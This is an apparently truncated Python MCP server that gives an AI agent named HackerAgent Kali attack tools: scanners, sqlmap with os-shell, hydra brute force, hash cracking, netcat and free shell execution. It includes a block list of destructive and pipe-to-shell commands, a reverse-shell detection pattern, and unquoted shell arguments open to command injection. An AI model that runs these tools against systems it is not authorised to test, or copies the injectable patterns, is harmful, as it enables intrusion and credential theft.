#!/usr/bin/env python3
"""
MCP Kali Tools Server — Kali Linux güvenlik araçlarını HackerAgent orkestratörüne expose eder.
FastMCP kullanarak nmap, gobuster, ffuf, sqlmap, nikto, hydra ve daha fazlasını
MCP tool'ları olarak sunar. Herhangi bir MCP-uyumlu istemciyle çalışır.

Kullanım:
    python server.py                          # stdio transport (varsayılan)
    python server.py --transport streamable-http --port 8080  # HTTP transport
"""

import subprocess
import shlex
import os
import json
import tempfile
import time
import re
import uuid
import asyncio
import base64
import requests  # Used for Hybrid Orchestration (Phase C)
from datetime import datetime
from mcp.server.fastmcp import FastMCP

# CCO veri dizini — CCO_HOME env variable veya ~/.cco
CCO_HOME = os.environ.get("CCO_HOME", os.path.expanduser("~/.cco"))
os.makedirs(CCO_HOME, exist_ok=True)

# Arkaplan daemon PIDs kaydı
daemon_processes = {}

# Server oluştur
mcp = FastMCP(
    "kali-tools",
    instructions="Kali Linux güvenlik araçlarına MCP erişimi — pentest, CTF ve bug bounty operasyonları için"
)

# ============================================================
# GÜVENLİK KATMANI — Command Validation & API Key Security
# ============================================================

# Kesinlikle engellenen komutlar/kalıplar
BLOCKED_COMMANDS = [
    "rm -rf /",
    "rm -rf /*",
    "dd if=/dev/zero",
    "dd if=/dev/random",
    "mkfs.",
    ":(){:|:&};:",     # Fork bomb
    "shutdown",
    "reboot",
    "poweroff",
    "init 0",
    "init 6",
    "chmod -R 777 /",
    "chown -R",
    "> /dev/sda",
    "mv / ",
    "wget -O- | sh",
    "wget -O- | bash",
    "curl | sh",
    "curl | bash",
]

# Regex ile tespit edilen tehlikeli patternler
DANGEROUS_PATTERNS = [
    r">/dev/sd[a-z]",                          # Disk overwrite
    r"\|\s*base64\s+-d\s*\|\s*(sh|bash)",     # Encoded shell execution
    r"python[23]?\s+-c\s*['\"].*__import__.*os.*system",  # Python reverse shell via import
    r"echo\s+.*\|\s*xxd\s+-r\s*\|\s*(sh|bash)",  # Hex encoded shell
    r"rm\s+-[rf]+\s+/[a-z]",                   # Recursive delete on system dirs
    r">(\s*)/etc/(passwd|shadow|sudoers)",      # System file overwrite
    r"crontab\s+-r",                            # Delete all crontabs
    r"iptables\s+-F",                            # Flush all firewall rules  
]

def validate_command(cmd: str) -> tuple:
    """Komutu güvenlik kontrolünden geçir.
    Returns: (is_safe: bool, reason: str)
    """
    cmd_lower = cmd.lower().strip()
    
    # Bloke edilen komut kontrolü
    for blocked in BLOCKED_COMMANDS:
        if blocked.lower() in cmd_lower:
            return False, f"🚫 ENGELLENDİ: '{blocked}' destructive komut yasak. Bu komut sisteme kalıcı hasar verebilir."
    
    # Regex pattern kontrolü
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, cmd, re.IGNORECASE):
            return False, f"🚫 ENGELLENDİ: Tehlikeli pattern tespit edildi ({pattern}). Komut güvenlik gerekçesiyle reddedildi."
    
    return True, "OK"


def get_api_key_secure() -> str:
    """OpenRouter API key'i güvenli hiyerarşiyle al:
    1. Environment variable (en güvenli)
    2. Python keyring (OS keychain)
    3. settings.json (fallback)
    """
    # 1. Environment variable (önce OPENROUTER_API_KEY, sonra ANTHROPIC_AUTH_TOKEN)
    key = os.environ.get("OPENROUTER_API_KEY") or os.environ.get("ANTHROPIC_AUTH_TOKEN", "")
    if key:
        return key
    
    # 2. Keyring (OS keychain entegrasyonu)
    try:
        import keyring
        key = keyring.get_password("cco", "openrouter")
        if key:
            return key
    except (ImportError, Exception):
        pass
    
    # 3. config.yaml / settings.json (fallback — en az güvenli)
    #    Önce yeni konum (~/.cco/config.yaml), sonra eski (~/.claude/settings.json)
    settings_candidates = [
        os.path.join(CCO_HOME, "config.yaml"),
        os.path.join(CCO_HOME, "settings.json"),
        os.path.expanduser("~/.claude/settings.json"),  # legacy
    ]
    for settings_path in settings_candidates:
        try:
            if os.path.exists(settings_path):
                if settings_path.endswith(".yaml") or settings_path.endswith(".yml"):
                    try:
                        import yaml
                        with open(settings_path, "r") as f:
                            data = yaml.safe_load(f) or {}
                        key = (
                            data.get("llm", {}).get("openrouter_api_key")
                            or data.get("openrouter_api_key", "")
                        )
                        if key:
                            return key
                    except ImportError:
                        continue
                else:
                    with open(settings_path, 'r') as f:
                        settings = json.load(f)
                        key = settings.get("openrouter_api_key", "")
                        if key:
                            return key
        except Exception:
            pass

    return ""


# ============================================================
# HUMAN-IN-THE-LOOP APPROVAL SİSTEMİ
# ============================================================

APPROVAL_DIR = os.path.join(CCO_HOME, "approvals")

def _ensure_approval_dir():
    os.makedirs(APPROVAL_DIR, exist_ok=True)

# ============================================================
# YARDIMCI FONKSİYONLAR
# ============================================================

def run_command(cmd: str, timeout: int = 300, cwd: str = None, retries: int = 1) -> dict:
    """Shell komutu çalıştır ve sonucu döndür. Ağ hatalarına karşı retry mekanizması içerir."""
    attempt = 0
    last_exception = ""
    
    while attempt <= retries:
        if attempt > 0:
            time.sleep(2) # Hata sonrası kısa bekleme

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=cwd
            )
            
            # Syntax hatalarında anlık geri bildirim için (Tool başarısız olursa orkestratör hatayı görsün)
            success = result.returncode == 0
            if not success and "usage" in result.stderr.lower():
                return {
                    "stdout": result.stdout,
                    "stderr": f"SÖZDİZİMİ HATASI (Syntax/Usage): Lütfen argümanları düzeltin.\nDetay: {result.stderr}",
                    "returncode": result.returncode,
                    "success": False
                }
                
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode,
                "success": success
            }
        except subprocess.TimeoutExpired:
            return {
                "stdout": "",
                "stderr": f"TIMEOUT: Komut {timeout} saniye içinde tamamlanmadı. Daha yüksek timeout verin.",
                "returncode": -1,
                "success": False
            }
        except Exception as e:
            last_exception = str(e)
            attempt += 1

    return {
        "stdout": "",
        "stderr": f"HATA: Komut {retries+1} denemede de başarısız oldu. Son hata: {last_exception}",
        "returncode": -1,
        "success": False
    }

def format_output(result: dict) -> str:
    """Komut çıktısını formatlı döndür."""
    output = ""
    if result["stdout"]:
        output += result["stdout"]
    if result["stderr"]:
        if output:
            output += "\n\n--- STDERR ---\n"
        output += result["stderr"]
    if not output:
        output = f"Komut tamamlandı (return code: {result['returncode']})"
    return output


# ============================================================
# ASİNKRON EXECUTION ENGİNE (v2.0 — Phase 3)
# ============================================================

async def run_command_async(cmd: str, timeout: int = 300, cwd: str = None) -> dict:
    """Asenkron shell komutu çalıştır."""
    try:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=cwd
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return {
                "stdout": stdout.decode('utf-8', errors='replace'),
                "stderr": stderr.decode('utf-8', errors='replace'),
                "returncode": proc.returncode,
                "success": proc.returncode == 0
            }
        except asyncio.TimeoutError:
            proc.kill()
            await proc.communicate()
            return {"stdout": "", "stderr": f"TIMEOUT: {timeout}s", "returncode": -1, "success": False}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1, "success": False}


def _run_parallel(coroutines):
    """Async coroutine'leri senkron kontekste çalıştır."""
    try:
        loop = asyncio.get_event_loop()
        if loop.is_running():
            import concurrent.futures
            with concurrent.futures.ThreadPoolExecutor() as pool:
                return pool.submit(asyncio.run, asyncio.gather(*coroutines)).result()
        else:
            return loop.run_until_complete(asyncio.gather(*coroutines))
    except RuntimeError:
        return asyncio.run(asyncio.gather(*coroutines))


@mcp.tool()
def parallel_recon(
    target: str,
    scan_types: str = "nmap,ffuf,whatweb,nuclei",
    timeout: int = 300
) -> str:
    """
    Birden fazla keşif aracını PARALEL çalıştır (4x hızlanma!).
    
    Args:
        target: Hedef IP/domain/URL
        scan_types: Virgülle ayrılmış araç listesi
                    Desteklenen: nmap, ffuf, whatweb, nuclei, subfinder, wafw00f, nikto, dirb
        timeout: Her araç için zaman aşımı (saniye)
    """
    task_map = {
        "nmap": f"nmap -sC -sV -T4 --top-ports 1000 {shlex.quote(target)}",
        "ffuf": f"ffuf -u http://{shlex.quote(target)}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -c -t 50 2>/dev/null",
        "whatweb": f"whatweb -a 3 http://{shlex.quote(target)} 2>/dev/null",
        "nuclei": f"nuclei -u http://{shlex.quote(target)} -severity critical,high -silent 2>/dev/null",
        "subfinder": f"subfinder -d {shlex.quote(target)} -silent 2>/dev/null",
        "wafw00f": f"wafw00f http://{shlex.quote(target)} 2>/dev/null",
        "nikto": f"nikto -h http://{shlex.quote(target)} -maxtime 120s 2>/dev/null",
        "dirb": f"dirb http://{shlex.quote(target)} /usr/share/dirb/wordlists/common.txt -S 2>/dev/null",
    }
    
    tools = [t.strip() for t in scan_types.split(",") if t.strip() in task_map]
    if not tools:
        return f"HATA: Geçerli araç bulunamadı. Desteklenen: {', '.join(task_map.keys())}"
    
    import time as _time
    start = _time.time()
    
    coroutines = [run_command_async(task_map[tool], timeout=timeout) for tool in tools]
    results = _run_parallel(coroutines)
    
    elapsed = _time.time() - start
    
    output = f"⚡ PARALEL RECON TAMAMLANDI ({len(tools)} araç, {elapsed:.1f}s)\n{'='*60}\n"
    for tool, result in zip(tools, results):
        status = "✓" if result["success"] else "✗"
        output += f"\n{'─'*50}\n[{status}] {tool.upper()}\n{'─'*50}\n"
        if result["stdout"]:
            # Çıktıyı makul uzunlukta tut
            lines = result["stdout"].strip().split("\n")
            if len(lines) > 50:
                output += "\n".join(lines[:50]) + f"\n... ({len(lines)-50} satır daha)\n"
            else:
                output += result["stdout"].strip() + "\n"
        if result["stderr"] and not result["success"]:
            output += f"STDERR: {result['stderr'][:200]}\n"
    
    output += f"\n{'='*60}\n⏱️ Toplam süre: {elapsed:.1f}s (sıralı tahmini: ~{elapsed * len(tools):.0f}s)\n"
    return output

# ============================================================
# NETWORK TARAMA ARAÇLARI
# ============================================================

@mcp.tool()
def nmap_scan(
    target: str,
    scan_type: str = "default",
    ports: str = "",
    scripts: str = "",
    extra_args: str = "",
    timeout: int = 600
) -> str:
    """
    Nmap ile port ve servis taraması yap.
    
    Args:
        target: Hedef IP/domain/CIDR
        scan_type: 'default' (-sC -sV), 'quick' (-T4 --top-ports 100), 
                   'full' (-p- -T4), 'udp' (-sU --top-ports 50),
                   'vuln' (--script=vuln), 'aggressive' (-A -T4),
                   'stealth' (-sS -T2)
        ports: Özel port belirtimi (ör: '80,443,8080' veya '1-1000')
        scripts: NSE scriptleri (ör: 'http-enum,http-headers')
        extra_args: Ek nmap argümanları
        timeout: Zaman aşımı (saniye)
    """
    scan_flags = {
        "default": "-sC -sV",
        "quick": "-T4 --top-ports 100 -sV",
        "full": "-p- -T4 --min-rate=1000",
        "udp": "-sU --top-ports 50 -T4",
        "vuln": "--script=vuln",
        "aggressive": "-A -T4",
        "stealth": "-sS -T2 -Pn"
    }
    
    flags = scan_flags.get(scan_type, scan_flags["default"])
    cmd = f"nmap {flags}"
    
    if ports:
        cmd += f" -p {ports}"
    if scripts:
        cmd += f" --script={scripts}"
    if extra_args:
        cmd += f" {extra_args}"
    
    cmd += f" {target}"
    
    result = run_command(cmd, timeout=timeout)
    return format_output(result)


@mcp.tool()
def masscan_scan(
    target: str,
    ports: str = "1-65535",
    rate: int = 1000,
    extra_args: str = ""
) -> str:
    """
    Masscan ile ultra hızlı port taraması yap.
    
    Args:
        target: Hedef IP/CIDR
        ports: Port aralığı
        rate: Paket gönderme hızı (pps)
        extra_args: Ek argümanlar
    """
    cmd = f"masscan -p{ports} --rate={rate} {extra_args} {target}"
    result = run_command(cmd, timeout=300)
    return format_output(result)

# ============================================================
# WEB KEŞİF ARAÇLARI
# ============================================================

@mcp.tool()
def ffuf_fuzz(
    url: str,
    wordlist: str = "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
    method: str = "GET",
    extensions: str = "",
    headers: str = "",
    data: str = "",
    filter_code: str = "",
    match_code: str = "200,301,302,403",
    filter_size: str = "",
    extra_args: str = "",
    timeout: int = 600
) -> str:
    """
    ffuf ile web fuzzing yap (dizin, parametre, vhost keşfi).
    
    Args:
        url: Hedef URL (FUZZ keyword'ünü kullan, ör: http://target.com/FUZZ)
        wordlist: Wordlist dosya yolu
        method: HTTP metodu (GET, POST, PUT)
        extensions: Dosya uzantıları (ör: 'php,html,txt,js')
        headers: Özel headerler (ör: 'Host: FUZZ.target.com')
        data: POST data (ör: 'user=admin&pass=FUZZ')
        filter_code: Filtrelenecek HTTP kodları (ör: '404,403')
        match_code: Eşleşecek HTTP kodları
        filter_size: Filtrelenecek response boyutu
        extra_args: Ek ffuf argümanları
        timeout: Zaman aşımı
    """
    cmd = f"ffuf -u {shlex.quote(url)} -w {wordlist}"
    
    if extensions:
        cmd += f" -e .{extensions.replace(',', ',.')}"
    if headers:
        cmd += f" -H {shlex.quote(headers)}"
    if method != "GET":
        cmd += f" -X {method}"
    if data:
        cmd += f" -d {shlex.quote(data)}"
    if filter_code:
        cmd += f" -fc {filter_code}"
    elif match_code:
        cmd += f" -mc {match_code}"
    if filter_size:
        cmd += f" -fs {filter_size}"
    if extra_args:
        cmd += f" {extra_args}"
    
    cmd += " -c"  # Renkli çıktı
    
    result = run_command(cmd, timeout=timeout)
    return format_output(result)


@mcp.tool()
def gobuster_scan(
    url: str,
    mode: str = "dir",
    wordlist: str = "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt",
    extensions: str = "",
    extra_args: str = "",
    timeout: int = 600
) -> str:
    """
    Gobuster ile dizin/DNS/VHost keşfi yap.
    
    Args:
        url: Hedef URL veya domain
        mode: 'dir' (dizin), 'dns' (subdomain), 'vhost' (virtual host)
        wordlist: Wordlist dosya yolu
        extensions: Dosya uzantıları (ör: 'php,html,txt')
        extra_args: Ek argümanlar
        timeout: Zaman aşımı
    """
    cmd = f"gobuster {mode} -u {shlex.quote(url)} -w {wordlist}"
    
    if extensions and mode == "dir":
        cmd += f" -x {extensions}"
    if extra_args:
        cmd += f" {extra_args}"
    
    result = run_command(cmd, timeout=timeout)
    return format_output(result)


@mcp.tool()
def nikto_scan(
    target: str,
    extra_args: str = "",
    timeout: int = 600
) -> str:
    """
    Nikto ile web server zafiyet taraması yap.
    
    Args:
        target: Hedef URL/IP
        extra_args: Ek nikto argümanları
        timeout: Zaman aşımı
    """
    cmd = f"nikto -h {shlex.quote(target)} {extra_args}"
    result = run_command(cmd, timeout=timeout)
    return format_output(result)


@mcp.tool()
def whatweb_fingerprint(
    target: str,
    aggression: int = 3,
    extra_args: str = ""
) -> str:
    """
    WhatWeb ile web teknoloji fingerprinting yap.
    
    Args:
        target: Hedef URL
        aggression: Agresiflik seviyesi (1-4)
        extra_args: Ek argümanlar
    """
    cmd = f"whatweb -a {aggression} {shlex.quote(target)} {extra_args}"
    result = run_command(cmd)
    return format_output(result)


@mcp.tool()
def nuclei_scan(
    target: str,
    severity: str = "critical,high,medium",
    templates: str = "",
    tags: str = "",
    extra_args: str = "",
    timeout: int = 900
) -> str:
    """
    Nuclei ile template tabanlı zafiyet taraması yap.
    
    Args:
        target: Hedef URL
        severity: Severity filtresi (critical, high, medium, low, info)
        templates: Özel template yolu
        tags: Tag filtresi (ör: 'cve,sqli,xss')
        extra_args: Ek argümanlar
        timeout: Zaman aşımı
    """
    cmd = f"nuclei -u {shlex.quote(target)} -severity {severity}"
    
    if templates:
        cmd += f" -t {templates}"
    if tags:
        cmd += f" -tags {tags}"
    if extra_args:
        cmd += f" {extra_args}"
    
    result = run_command(cmd, timeout=timeout)
    return format_output(result)

# ============================================================
# EXPLOITATION ARAÇLARI
# ============================================================

@mcp.tool()
def sqlmap_test(
    url: str = "",
    request_file: str = "",
    data: str = "",
    parameter: str = "",
    cookie: str = "",
    headers: str = "",
    level: int = 1,
    risk: int = 1,
    technique: str = "",
    tamper: str = "",
    action: str = "dbs",
    database: str = "",
    table: str = "",
    extra_args: str = "",
    timeout: int = 600
) -> str:
    """
    SQLMap ile SQL injection testi yap.
    
    Args:
        url: Hedef URL (parametre ile, ör: http://target.com/page?id=1)
        request_file: Burp/ZAP'tan kaydedilmiş request dosyası
        data: POST verisi (ör: 'user=admin&pass=test')
        parameter: Test edilecek parametre
        cookie: Cookie string
        headers: Ek headerler
        level: Test seviyesi (1-5)
        risk: Risk seviyesi (1-3)
        technique: Teknik (B:boolean, E:error, U:union, S:stacked, T:time, Q:inline)
        tamper: Tamper script'leri (ör: 'space2comment,between')
        action: 'dbs', 'tables', 'dump', 'os-shell', 'file-read'
        database: Veritabanı adı (tables/dump için)
        table: Tablo adı (dump için)
        extra_args: Ek argümanlar
        timeout: Zaman aşımı
    """
    cmd = "sqlmap --batch"
    
    if request_file:
        cmd += f" -r {request_file}"
    elif url:
        cmd += f" -u {shlex.quote(url)}"
    
    if data:
        cmd += f" --data={shlex.quote(data)}"
    if parameter:
        cmd += f" -p {parameter}"
    if cookie:
        cmd += f" --cookie={shlex.quote(cookie)}"
    if headers:
        cmd += f" --headers={shlex.quote(headers)}"
    if level > 1:
        cmd += f" --level={level}"
    if risk > 1:
        cmd += f" --risk={risk}"
    if technique:
        cmd += f" --technique={technique}"
    if tamper:
        cmd += f" --tamper={tamper}"
    
    # Action
    if action == "dbs":
        cmd += " --dbs"
    elif action == "tables":
        cmd += f" -D {database} --tables"
    elif action == "dump":
        cmd += f" -D {database} -T {table} --dump"
    elif action == "os-shell":
        cmd += " --os-shell"
    elif action == "file-read":
        cmd += f" --file-read={extra_args.split('=', 1)[1] if '=' in extra_args else '/etc/passwd'}"
    
    if extra_args and action != "file-read":
        cmd += f" {extra_args}"
    
    result = run_command(cmd, timeout=timeout)
    return format_output(result)


@mcp.tool()
def hydra_brute(
    target: str,
    service: str,
    username: str = "",
    username_list: str = "",
    password_list: str = "/usr/share/wordlists/rockyou.txt",
    port: int = 0,
    extra_args: str = "",
    timeout: int = 600
) -> str:
    """
    Hydra ile brute-force saldırısı yap.
    
    Args:
        target: Hedef IP/domain
        service: Servis (ssh, ftp, http-post-form, mysql, rdp, smb, vnc, telnet)
        username: Tek kullanıcı adı
        username_list: Kullanıcı adı wordlist'i
        password_list: Şifre wordlist'i
        port: Özel port numarası
        extra_args: Ek argümanlar (http-post-form için form parametreleri)
        timeout: Zaman aşımı
    """
    cmd = "hydra"
    
    if username:
        cmd += f" -l {username}"
    elif username_list:
        cmd += f" -L {username_list}"
    
    cmd += f" -P {password_list}"
    
    if port:
        cmd += f" -s {port}"
    
    cmd += f" {target} {service}"
    
    if extra_args:
        cmd += f" {extra_args}"
    
    result = run_command(cmd, timeout=timeout)
    return format_output(result)

# ============================================================
# SUBDOMAIN VE DNS ARAÇLARI
# ============================================================

@mcp.tool()
def subfinder_enum(
    domain: str,
    extra_args: str = ""
) -> str:
    """
    Subfinder ile subdomain enumeration yap.
    
    Args:
        domain: Hedef domain
        extra_args: Ek argümanlar
    """
    cmd = f"subfinder -d {domain} -silent {extra_args}"
    result = run_command(cmd, timeout=300)
    return format_output(result)


@mcp.tool()
def dig_dns(
    domain: str,
    record_type: str = "ANY",
    nameserver: str = "",
    extra_args: str = ""
) -> str:
    """
    dig ile DNS sorgusu yap.
    
    Args:
        domain: Hedef domain
        record_type: Kayıt tipi (A, AAAA, MX, TXT, NS, CNAME, SOA, ANY, AXFR)
        nameserver: DNS server (ör: 8.8.8.8)
        extra_args: Ek argümanlar
    """
    cmd = f"dig {record_type} {domain}"
    if nameserver:
        cmd += f" @{nameserver}"
    if extra_args:
        cmd += f" {extra_args}"
    
    result = run_command(cmd)
    return format_output(result)

# ============================================================
# PASSWORD CRACKING
# ============================================================

@mcp.tool()
def hashcat_crack(
    hash_value: str = "",
    hash_file: str = "",
    hash_mode: int = 0,
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
    rules: str = "",
    extra_args: str = "",
    timeout: int = 600
) -> str:
    """
    Hashcat ile hash kırma.
    
    Args:
        hash_value: Tek hash değeri
        hash_file: Hash dosyası yolu
        hash_mode: Hash modu (0:MD5, 100:SHA1, 1400:SHA256, 1700:SHA512, 
                   1000:NTLM, 3200:bcrypt, 1800:sha512crypt, 16500:JWT)
        wordlist: Wordlist yolu
        rules: Rule dosyası
        extra_args: Ek argümanlar
        timeout: Zaman aşımı
    """
    if hash_value and not hash_file:
        # Hash'i geçici dosyaya yaz
        tmp = tempfile.NamedTemporaryFile(mode='w', suffix='.hash', delete=False)
        tmp.write(hash_value)
        tmp.close()
        hash_file = tmp.name
    
    cmd = f"hashcat -m {hash_mode} {hash_file} {wordlist} --force"
    
    if rules:
        cmd += f" -r {rules}"
    if extra_args:
        cmd += f" {extra_args}"
    
    result = run_command(cmd, timeout=timeout)
    return format_output(result)


@mcp.tool()
def john_crack(
    hash_file: str,
    format: str = "",
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
    extra_args: str = "",
    timeout: int = 600
) -> str:
    """
    John the Ripper ile hash kırma.
    
    Args:
        hash_file: Hash dosyası yolu
        format: Hash formatı (ör: raw-md5, raw-sha256, bcrypt, nt)
        wordlist: Wordlist yolu
        extra_args: Ek argümanlar
        timeout: Zaman aşımı
    """
    cmd = f"john --wordlist={wordlist}"
    if format:
        cmd += f" --format={format}"
    if extra_args:
        cmd += f" {extra_args}"
    cmd += f" {hash_file}"
    
    result = run_command(cmd, timeout=timeout)
    
    # Kırılmış hash'leri göster
    show_result = run_command(f"john --show {hash_file}")
    output = format_output(result)
    if show_result["stdout"]:
        output += f"\n\n--- KIRILAN HASH'LER ---\n{show_result['stdout']}"
    
    return output

# ============================================================
# CMS TARAMA
# ============================================================

@mcp.tool()
def wpscan_scan(
    url: str,
    enumerate: str = "u,p,t,vp",
    api_token: str = "",
    extra_args: str = "",
    timeout: int = 600
) -> str:
    """
    WPScan ile WordPress zafiyet taraması yap.
    
    Args:
        url: WordPress site URL'si
        enumerate: Numaralandırma seçenekleri (u:users, p:plugins, t:themes, vp:vulnerable plugins)
        api_token: WPScan API token
        extra_args: Ek argümanlar
        timeout: Zaman aşımı
    """
    cmd = f"wpscan --url {shlex.quote(url)} --enumerate {enumerate}"
    if api_token:
        cmd += f" --api-token {api_token}"
    if extra_args:
        cmd += f" {extra_args}"
    
    result = run_command(cmd, timeout=timeout)
    return format_output(result)

# ============================================================
# SMB/NETWORK ENUMERATION
# ============================================================

@mcp.tool()
def enum4linux_scan(
    target: str,
    extra_args: str = "-a"
) -> str:
    """
    enum4linux ile SMB/NetBIOS enumeration yap.
    
    Args:
        target: Hedef IP
        extra_args: Ek argümanlar (-a: tüm enumeration)
    """
    cmd = f"enum4linux {extra_args} {target}"
    result = run_command(cmd, timeout=120)
    return format_output(result)

# ============================================================
# GENEL ARAÇLAR
# ============================================================

@mcp.tool()
def curl_request(
    url: str,
    method: str = "GET",
    headers: str = "",
    data: str = "",
    cookie: str = "",
    follow_redirects: bool = True,
    show_headers: bool = False,
    extra_args: str = ""
) -> str:
    """
    curl ile HTTP request gönder.
    
    Args:
        url: Hedef URL
        method: HTTP metodu (GET, POST, PUT, DELETE, PATCH)
        headers: Özel headerler (';' ile ayır, ör: 'Content-Type: application/json;Authorization: Bearer xxx')
        data: Request body
        cookie: Cookie string
        follow_redirects: Redirect'leri takip et
        show_headers: Response header'larını göster
        extra_args: Ek curl argümanları
    """
    cmd = "curl -s"
    
    if show_headers:
        cmd += " -v"
    if method != "GET":
        cmd += f" -X {method}"
    if headers:
        for h in headers.split(';'):
            cmd += f" -H {shlex.quote(h.strip())}"
    if data:
        cmd += f" -d {shlex.quote(data)}"
    if cookie:
        cmd += f" -b {shlex.quote(cookie)}"
    if follow_redirects:
        cmd += " -L"
    if extra_args:
        cmd += f" {extra_args}"
    
    cmd += f" {shlex.quote(url)}"
    
    result = run_command(cmd)
    return format_output(result)


@mcp.tool()
def netcat_connect(
    target: str,
    port: int,
    data: str = "",
    listen: bool = False,
    udp: bool = False,
    timeout_secs: int = 10
) -> str:
    """
    Netcat ile TCP/UDP bağlantısı kur.
    
    Args:
        target: Hedef IP/domain
        port: Port numarası
        data: Gönderilecek veri
        listen: Dinleme modu
        udp: UDP kullan
        timeout_secs: Bağlantı timeout'u
    """
    if listen:
        cmd = f"timeout {timeout_secs} nc -nlvp {port}"
    else:
        cmd = f"timeout {timeout_secs} nc -nv"
        if udp:
            cmd += " -u"
        cmd += f" {target} {port}"
    
    if data:
        cmd = f"echo {shlex.quote(data)} | {cmd}"
    
    result = run_command(cmd, timeout=timeout_secs + 5)
    return format_output(result)


@mcp.tool()
def python_exec(
    code: str = "",
    script_file: str = "",
    args: str = "",
    timeout: int = 120
) -> str:
    """
    Python3 kodu veya script çalıştır.
    
    Args:
        code: Çalıştırılacak Python kodu
        script_file: Çalıştırılacak Python dosyası
        args: Script argümanları
        timeout: Zaman aşımı
    """
    if code:
        cmd = f"python3 -c {shlex.quote(code)}"
    elif script_file:
        cmd = f"python3 {script_file} {args}"
    else:
        return "HATA: code veya script_file parametresi gerekli"
    
    result = run_command(cmd, timeout=timeout)
    return format_output(result)


@mcp.tool()
def shell_exec(
    command: str,
    cwd: str = None,
    timeout: int = 120
) -> str:
    """
    Genel shell komutu çalıştır. GÜVENLİK KATMANI AKTİF — destructive komutlar engellenir.
    
    Args:
        command: Çalıştırılacak shell komutu
        cwd: Çalışma dizini
        timeout: Zaman aşımı
    """
    # Güvenlik kontrolü
    is_safe, reason = validate_command(command)
    if not is_safe:
        return reason
    
    result = run_command(command, timeout=timeout, cwd=cwd)
    return format_output(result)


@mcp.tool()
def file_analyze(
    filepath: str
) -> str:
    """
    Dosya analizi yap (file, strings, checksec, exiftool, binwalk).
    
    Args:
        filepath: Analiz edilecek dosya yolu
    """
    outputs = []
    
    # file komutu
    r = run_command(f"file {shlex.quote(filepath)}")
    outputs.append(f"=== FILE ===\n{r['stdout']}")
    
    # strings (ilk 50 satır)
    r = run_command(f"strings {shlex.quote(filepath)} | head -50")
    outputs.append(f"\n=== STRINGS (ilk 50) ===\n{r['stdout']}")
    
    # xxd (ilk 100 byte)
    r = run_command(f"xxd {shlex.quote(filepath)} | head -10")
    outputs.append(f"\n=== HEX DUMP (ilk 160 byte) ===\n{r['stdout']}")
    
    # checksec (ELF ise)
    r = run_command(f"checksec --file={shlex.quote(filepath)} 2>/dev/null")
    if r['stdout']:
        outputs.append(f"\n=== CHECKSEC ===\n{r['stdout']}")
    
    # exiftool
    r = run_command(f"exiftool {shlex.quote(filepath)} 2>/dev/null")
    if r['stdout']:
        outputs.append(f"\n=== EXIFTOOL (Metadata) ===\n{r['stdout']}")
    
    # binwalk
    r = run_command(f"binwalk {shlex.quote(filepath)} 2>/dev/null")
    if r['stdout']:
        outputs.append(f"\n=== BINWALK ===\n{r['stdout']}")
    
    return "\n".join(outputs)


@mcp.tool()
def searchsploit_search(
    query: str,
    extra_args: str = ""
) -> str:
    """
    SearchSploit ile exploit-db'de zafiyet ara.
    
    Args:
        query: Arama sorgusu (ör: 'apache 2.4.49', 'wordpress 5.0')
        extra_args: Ek argümanlar
    """
    cmd = f"searchsploit {shlex.quote(query)} {extra_args}"
    result = run_command(cmd)
    return format_output(result)

# ============================================================
# SUPERVISOR DAEMON & HYBRID ORCHESTRATION (Phase C)
# ============================================================

@mcp.tool()
def qwen_analyze(
    target: str,
    data: str,
    analysis_type: str = "vulnerability",
    openrouter_api_key: str = None
) -> str:
    """
    Qwen 3.6 Plus ile derinlemesine zafiyet analizi, trafik analizi veya kod güvenlik incelemesi yap.
    Orkestratör (HackerAgent) karar verdikten sonra, analiz derinliği gerektiren durumlarda
    bu tool'u çağırarak Qwen'in analitik gücünden faydalanır.
    
    Args:
        target: Hedef bilgisi (IP, domain, URL veya bağlam)
        data: Analiz edilecek veri (PCAP özeti, kaynak kod, HTTP response, log, nmap çıktısı vb.)
        analysis_type: Analiz tipi:
            - 'vulnerability': Zafiyet analizi ve exploit yolu önerisi
            - 'traffic': Ağ trafiği / PCAP analizi
            - 'code_review': Kaynak kod güvenlik incelemesi
            - 'log_analysis': Log dosyası analizi ve anomali tespiti
            - 'pattern': Veri içinde pattern/flag/gizli bilgi arama
            - 'reverse': Decompile edilmiş kod analizi
            - 'crypto': Kriptografik analiz (şifre tipi tespiti, zayıflık analizi)
        openrouter_api_key: OpenRouter API anahtarı (None ise settings.json'dan okunur)
    """
    # API key kontrolü (güvenli hiyerarşi: env > keyring > settings.json)
    api_key = openrouter_api_key or get_api_key_secure()

    if not api_key:
        return "HATA: OpenRouter API key bulunamadı. Şu yöntemlerden birini kullanın:\n1. OPENROUTER_API_KEY env var\n2. keyring: python3 -c \"import keyring; keyring.set_password('cco','openrouter','YOUR_KEY')\"\n3. ~/.cco/config.yaml → llm.openrouter_api_key alanı"

    analysis_prompts = {
        "vulnerability": "You are an expert penetration tester and vulnerability analyst. Analyze the following data from the target system. Identify all potential vulnerabilities, rank them by severity (Critical/High/Medium/Low), suggest specific exploit techniques, and provide exact commands or payloads to verify each finding.",
        "traffic": "You are a network forensics expert. Analyze the following network traffic data. Identify suspicious patterns, potential attacks, data exfiltration, credential leaks, C2 communication, unusual protocols, and any hidden information.",
        "code_review": "You are a senior application security engineer. Perform a thorough security code review of the following source code. Identify all security vulnerabilities including injection flaws, authentication issues, authorization bypasses, cryptographic weaknesses, sensitive data exposure, and provide specific line references and fix recommendations.",
        "log_analysis": "You are a SOC analyst and incident responder. Analyze the following log data. Identify indicators of compromise (IoCs), suspicious activities, failed/successful attacks, lateral movement, privilege escalation attempts, and provide a timeline of events.",
        "pattern": "You are a CTF expert and data analyst. Examine the following data carefully. Look for hidden flags (flag{}, CTF{}, or custom formats), encoded data (base64, hex, binary, morse), steganographic patterns, unusual strings, and any concealed information.",
